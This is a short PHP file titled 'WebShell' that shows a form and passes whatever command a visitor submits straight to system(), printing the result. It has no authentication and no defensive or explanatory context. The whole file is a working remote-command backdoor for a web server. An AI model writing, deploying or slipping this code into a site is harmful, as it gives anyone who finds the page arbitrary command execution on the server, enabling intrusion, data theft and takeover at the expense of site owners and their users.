<html>
	<head>
		<style>
			.center {
				text-align: center;
				border: 3px solid green;
				}
			.centerform {
				text-align: center;
				}
		</style>
	</head>
	<body>
		<div class="center">
			<h1>WebShell</h1>
		</div>
			</br>
			</br>
			</br>
			</br>
			<div class="centerform">
				<form method="POST" action="webshell.php">
				<input type="TEXT" name="webshell" autofocus id="webshell" size="10" placeholder="Ex: ls">
				<input type="SUBMIT" value="Start">
			</div>
	</form>
	<pre>
	<?php
		if (isset($_POST['webshell']))
		{
			echo " <div class='centerform'><pre>";
			system($_POST['webshell']);
			echo "</div></pre>";
			die;
		}
	?>
	</pre>
	</body>
</html>
